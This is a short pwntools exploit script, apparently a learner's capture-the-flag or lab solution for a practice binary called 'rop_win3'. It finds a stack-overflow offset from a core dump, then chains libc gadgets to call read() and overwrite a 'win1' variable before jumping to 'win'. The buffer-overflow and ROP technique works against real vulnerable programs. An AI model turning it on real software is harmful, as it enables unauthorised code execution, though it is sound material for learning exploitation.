from pwn import *

elf=context.binary =ELF("./rop_win3")
p=process(elf.path)

p.sendlineafter(b"Input: ",cyclic(200))
p.wait()

core=p.corefile
log.info(f"rsi--->> {core.rsi}")
crashed_data=core.read(core.rsp,8)
offset=cyclic_find(crashed_data[:4])

p=process(elf.path)

"""
i wanna create read() with its 3 args  and make it read from stdin i'll send, read at win1_addr, with 12-bytes
rsi,rdi,rdx then call func read from his addr then send the data after create all that, send it in stdin

read(0,&win1, 12)
"""
libc=elf.libc
libc.address=p.libc.address

pop_rsi= ROP(libc).find_gadget(["pop rsi","ret"])[0]
pop_rdi= ROP(libc).find_gadget(["pop rdi","ret"])[0]
pop_rdx= ROP(libc).find_gadget(["pop rdx","ret"])[0]    # if you wanna remve [0] you can add .address

win1=elf.sym["win1"]
win2=1
win3=1
win=elf.sym["win"]
read_addr=libc.sym["read"]      #not from elf its shared in libc  most more

payload=flat(b"A"*offset, pop_rdi,0, pop_rsi,win1, pop_rdx,12, read_addr, win ) # how it will acces win
p.sendlineafter(b"Input: ",payload)
# the read will wait until recv any data from stdin 0 so lets send the data that will be store at win1

p.sendline(p32(1)+p32(1)+p32(1))

print(p.recvall().decode())
